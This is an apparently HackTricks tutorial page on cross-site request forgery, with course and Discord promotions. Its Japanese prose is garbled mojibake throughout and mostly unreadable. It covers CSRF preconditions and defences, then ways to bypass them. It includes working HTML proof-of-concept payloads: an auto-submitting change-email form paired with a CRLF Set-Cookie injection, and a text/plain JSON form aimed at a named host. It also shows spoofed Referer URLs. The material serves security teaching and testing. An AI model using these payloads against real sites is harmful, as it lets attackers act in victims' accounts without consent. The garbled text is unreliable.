# CSRF (ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª (CSRF) ã®èª¬æ˜

**ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª (CSRF)** ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¦‹ã‚‰ã‚Œã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ã®ä¸€ç¨®ã§ã™ã€‚ã“ã‚Œã¯ã€æ”»æ’ƒè€…ãŒèªè¨¼ã•ã‚ŒãŸã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦ã€ç„¡é˜²å‚™ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä»£ã‚ã‚Šã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚æ”»æ’ƒã¯ã€è¢«å®³è€…ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆã‚’è¨ªã‚ŒãŸã¨ãã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®ã‚µã‚¤ãƒˆã¯ã€JavaScriptã®å®Ÿè¡Œã€ãƒ•ã‚©ãƒ¼ãƒ ã®é€ä¿¡ã€ã¾ãŸã¯ç”»åƒã®å–å¾—ãªã©ã®æ–¹æ³•ã‚’é€šã˜ã¦ã€è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

### CSRFæ”»æ’ƒã®å‰ææ¡ä»¶

CSRFè„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ã„ãã¤ã‹ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

1. **ä¾¡å€¤ã®ã‚ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç‰¹å®šã™ã‚‹**: æ”»æ’ƒè€…ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¤‰æ›´ã€ã¾ãŸã¯æ¨©é™ã®æ˜‡æ ¼ãªã©ã€æ‚ªç”¨ã™ã‚‹ä¾¡å€¤ã®ã‚ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
2. **ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†**: ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ã€ã‚¯ãƒƒã‚­ãƒ¼ã¾ãŸã¯HTTPåŸºæœ¬èªè¨¼ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é€šã˜ã¦ã®ã¿ç®¡ç†ã•ã‚Œã‚‹ã¹ãã§ã™ã€‚ä»–ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã“ã®ç›®çš„ã®ãŸã‚ã«æ“ä½œã§ãã¾ã›ã‚“ã€‚
3. **äºˆæ¸¬ä¸å¯èƒ½ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ä¸åœ¨**: ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯äºˆæ¸¬ä¸å¯èƒ½ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¦ã„ãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯æ”»æ’ƒã‚’é˜²ãå¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚¯ã‚¤ãƒƒã‚¯ãƒã‚§ãƒƒã‚¯

**Burpã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£**ã—ã€CSRFä¿è­·ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ãƒ†ã‚¹ãƒˆã™ã‚‹ã«ã¯ã€**Copy as fetch**ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç¢ºèªã§ãã¾ã™ï¼š

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CSRFã‹ã‚‰ã®é˜²å¾¡

CSRFæ”»æ’ƒã‹ã‚‰ä¿è­·ã™ã‚‹ãŸã‚ã«å®Ÿè£…ã§ãã‚‹ã„ãã¤ã‹ã®å¯¾ç­–ãŒã‚ã‚Šã¾ã™ï¼š

* [**SameSiteã‚¯ãƒƒã‚­ãƒ¼**](hacking-with-cookies/#samesite): ã“ã®å±æ€§ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨å…±ã«ã‚¯ãƒƒã‚­ãƒ¼ã‚’é€ä¿¡ã™ã‚‹ã®ã‚’é˜²ãã¾ã™ã€‚[SameSiteã‚¯ãƒƒã‚­ãƒ¼ã®è©³ç´°](hacking-with-cookies/#samesite)ã€‚
* [**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚½ãƒ¼ã‚¹ã‚·ã‚§ã‚¢ãƒªãƒ³ã‚°**](cors-bypass.md): è¢«å®³è€…ã‚µã‚¤ãƒˆã®CORSãƒãƒªã‚·ãƒ¼ã¯ã€æ”»æ’ƒã®å®Ÿè¡Œå¯èƒ½æ€§ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹ã«ã€æ”»æ’ƒãŒè¢«å®³è€…ã‚µã‚¤ãƒˆã‹ã‚‰ã®å¿œç­”ã‚’èª­ã¿å–ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€‚[CORSãƒã‚¤ãƒ‘ã‚¹ã«ã¤ã„ã¦å­¦ã¶](cors-bypass.md)ã€‚
* **ãƒ¦ãƒ¼ã‚¶ãƒ¼ç¢ºèª**: ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ±‚ã‚ãŸã‚Šã€ã‚­ãƒ£ãƒ—ãƒãƒ£ã‚’è§£æ±ºã•ã›ãŸã‚Šã™ã‚‹ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ„å›³ã‚’ç¢ºèªã§ãã¾ã™ã€‚
* **ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ã¾ãŸã¯ã‚ªãƒªã‚¸ãƒ³ãƒ˜ãƒƒãƒ€ãƒ¼ã®ç¢ºèª**: ã“ã‚Œã‚‰ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ¤œè¨¼ã™ã‚‹ã“ã¨ã§ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒä¿¡é ¼ã§ãã‚‹ã‚½ãƒ¼ã‚¹ã‹ã‚‰æ¥ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã§ãã¾ã™ã€‚ãŸã ã—ã€URLã‚’æ…é‡ã«ä½œæˆã™ã‚‹ã“ã¨ã§ã€å®Ÿè£…ãŒä¸ååˆ†ãªãƒã‚§ãƒƒã‚¯ã‚’å›é¿ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š
* `http://mal.net?orig=http://example.com`ã‚’ä½¿ç”¨ã™ã‚‹ï¼ˆURLãŒä¿¡é ¼ã§ãã‚‹URLã§çµ‚ã‚ã‚‹ï¼‰
* `http://example.com.mal.net`ã‚’ä½¿ç”¨ã™ã‚‹ï¼ˆURLãŒä¿¡é ¼ã§ãã‚‹URLã§å§‹ã¾ã‚‹ï¼‰
* **ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åã®å¤‰æ›´**: POSTã¾ãŸã¯GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€è‡ªå‹•åŒ–ã•ã‚ŒãŸæ”»æ’ƒã‚’é˜²ãã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
* **CSRFãƒˆãƒ¼ã‚¯ãƒ³**: å„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’çµ„ã¿è¾¼ã¿ã€ä»¥é™ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦æ±‚ã™ã‚‹ã“ã¨ã§ã€CSRFã®ãƒªã‚¹ã‚¯ã‚’å¤§å¹…ã«è»½æ¸›ã§ãã¾ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã®åŠ¹æœã¯CORSã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ã§é«˜ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚‰ã®é˜²å¾¡ã‚’ç†è§£ã—å®Ÿè£…ã™ã‚‹ã“ã¨ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨æ•´åˆæ€§ã‚’ç¶­æŒã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚

## é˜²å¾¡ã®ãƒã‚¤ãƒ‘ã‚¹

### POSTã‹ã‚‰GETã¸

æ‚ªç”¨ã—ãŸã„ãƒ•ã‚©ãƒ¼ãƒ ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã¤POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã‚ˆã†ã«æº–å‚™ã•ã‚Œã¦ã„ã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€**GET**ã‚‚**æœ‰åŠ¹**ã§ã‚ã‚Šã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ãŸã¨ãã«**CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒã¾ã æ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ã‹**ã‚’**ç¢ºèª**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒˆãƒ¼ã‚¯ãƒ³ã®æ¬ å¦‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ã™ã‚‹ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã—ã‹ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå­˜åœ¨ã—ãªã„å ´åˆã«æ¤œè¨¼ãŒå®Œå…¨ã«ã‚¹ã‚­ãƒƒãƒ—ã•ã‚Œã‚‹ã¨ã€è„†å¼±æ€§ãŒç”Ÿã˜ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã¤ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’**å‰Šé™¤ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦**ã“ã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ¤œè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã‚’å›é¿ã—ã€ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª (CSRF) æ”»æ’ƒã‚’åŠ¹æœçš„ã«å®Ÿè¡Œã§ãã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«çµã³ã¤ã„ã¦ã„ãªã„

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«çµã³ã¤ã‘ã¦ã„ãªã„**å ´åˆã€é‡å¤§ãª**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯**ãŒå­˜åœ¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€å„ãƒˆãƒ¼ã‚¯ãƒ³ãŒé–‹å§‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«çµã³ã¤ã„ã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ã®ã§ã¯ãªãã€**ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ¼ãƒ«**ã«å¯¾ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼ã—ã¾ã™ã€‚

æ”»æ’ƒè€…ãŒã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

1. **è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦èªè¨¼**ã—ã¾ã™ã€‚
2. **ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ¼ãƒ«ã‹ã‚‰æœ‰åŠ¹ãªCSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—**ã—ã¾ã™ã€‚
3. **ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦**ã€è¢«å®³è€…ã«å¯¾ã™ã‚‹CSRFæ”»æ’ƒã‚’è¡Œã„ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã®ä»£ã‚ã‚Šã«ç„¡è¨±å¯ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®**ä¸ååˆ†ãªãƒˆãƒ¼ã‚¯ãƒ³æ¤œè¨¼ãƒ¡ã‚«ãƒ‹ã‚ºãƒ **ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚

### ãƒ¡ã‚½ãƒƒãƒ‰ãƒã‚¤ãƒ‘ã‚¹

ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã€Œ**å¥‡å¦™ãª**ã€**ãƒ¡ã‚½ãƒƒãƒ‰**ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚½ãƒƒãƒ‰**ã®**ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰æ©Ÿèƒ½**ãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„ã€‚ä¾‹ãˆã°ã€**PUT**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦**é€ä¿¡**ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

ã“ã‚Œã‚‚ã€**POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã«\_methodãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹**ã‹ã€**ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§æ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹

ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ**CSRFä¿è­·ãƒ¡ã‚½ãƒƒãƒ‰**ã¨ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’æŒã¤**ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’è¿½åŠ ã—ã¦ã„ã‚‹å ´åˆï¼š

* **ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒ˜ãƒƒãƒ€ãƒ¼ãªã—ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆ**ã—ã¾ã™ã€‚
* **åŒã˜é•·ã•ã ãŒç•°ãªã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆ**ã—ã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚Œã‚‹

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒƒã‚­ãƒ¼ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ä¸¡æ–¹ã«è¤‡è£½ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦CSRFä¿è­·ã‚’å®Ÿè£…ã™ã‚‹ã‹ã€CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§é€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«å¯¾å¿œã—ã¦ã„ã‚‹ã‹ã‚’æ¤œè¨¼ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã®å€¤ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ¤œè¨¼ã—ã¾ã™ã€‚

ã—ã‹ã—ã€ã“ã®æ–¹æ³•ã¯ã€æ”»æ’ƒè€…ãŒè¢«å®³è€…ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã§ãã‚‹æ¬ é™¥ãŒã‚ã‚‹å ´åˆã€CSRFæ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã™ã‚‹æ¬ºççš„ãªç”»åƒã‚’èª­ã¿è¾¼ã‚“ã å¾Œã€CSRFæ”»æ’ƒã‚’é–‹å§‹ã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€æ”»æ’ƒãŒã©ã®ã‚ˆã†ã«æ§‹æˆã•ã‚Œã‚‹ã‹ã®ä¾‹ã§ã™ï¼š
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
æ³¨æ„ã—ã¦ãã ã•ã„ã€**csrfãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®æ”»æ’ƒã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€ã‚ãªãŸã¯è¢«å®³è€…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ãã®ãŸã‚è‡ªåˆ†è‡ªèº«ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚
{% endhint %}

### Content-Typeã®å¤‰æ›´

[**ã“ã‚Œ**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)ã«ã‚ˆã‚‹ã¨ã€**ãƒ—ãƒ¬ãƒ•ãƒ©ã‚¤ãƒˆ**ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é¿ã‘ã‚‹ãŸã‚ã«**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€è¨±å¯ã•ã‚Œã¦ã„ã‚‹Content-Typeã®å€¤ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ãŸã ã—ã€ä½¿ç”¨ã•ã‚Œã‚‹**Content-Type**ã«ã‚ˆã£ã¦ã¯**ã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ã‚¸ãƒƒã‚¯ãŒç•°ãªã‚‹å ´åˆãŒã‚ã‚‹**ãŸã‚ã€ä¸Šè¨˜ã®å€¤ã‚„**`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ãªã©ã®ä»–ã®å€¤ã‚‚è©¦ã™ã¹ãã§ã™ã€‚

ä¾‹ï¼ˆ[ã“ã¡ã‚‰](https://brycec.me/posts/corctf_2021_challenges)ã‹ã‚‰ï¼‰ã§ã¯ã€JSONãƒ‡ãƒ¼ã‚¿ã‚’text/plainã¨ã—ã¦é€ä¿¡ã—ã¦ã„ã¾ã™ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSONãƒ‡ãƒ¼ã‚¿ã®ãŸã‚ã®ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒã‚¤ãƒ‘ã‚¹

POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦JSONãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã‚ˆã†ã¨ã™ã‚‹éš›ã€HTMLãƒ•ã‚©ãƒ¼ãƒ ã§`Content-Type: application/json`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ç›´æ¥çš„ã«ã¯ä¸å¯èƒ½ã§ã™ã€‚åŒæ§˜ã«ã€`XMLHttpRequest`ã‚’ä½¿ç”¨ã—ã¦ã“ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—ã‚’é€ä¿¡ã™ã‚‹ã¨ã€ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé–‹å§‹ã•ã‚Œã¾ã™ã€‚ãã‚Œã§ã‚‚ã€ã“ã®åˆ¶é™ã‚’å›é¿ã—ã€ã‚µãƒ¼ãƒãƒ¼ãŒContent-Typeã«é–¢ä¿‚ãªãJSONãƒ‡ãƒ¼ã‚¿ã‚’å‡¦ç†ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®æˆ¦ç•¥ãŒã‚ã‚Šã¾ã™ï¼š

1. **ä»£æ›¿ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—ã®ä½¿ç”¨**: ãƒ•ã‚©ãƒ¼ãƒ ã§`enctype="text/plain"`ã‚’è¨­å®šã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€`Content-Type: text/plain`ã¾ãŸã¯`Content-Type: application/x-www-form-urlencoded`ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒContent-Typeã«é–¢ä¿‚ãªããƒ‡ãƒ¼ã‚¿ã‚’åˆ©ç”¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚
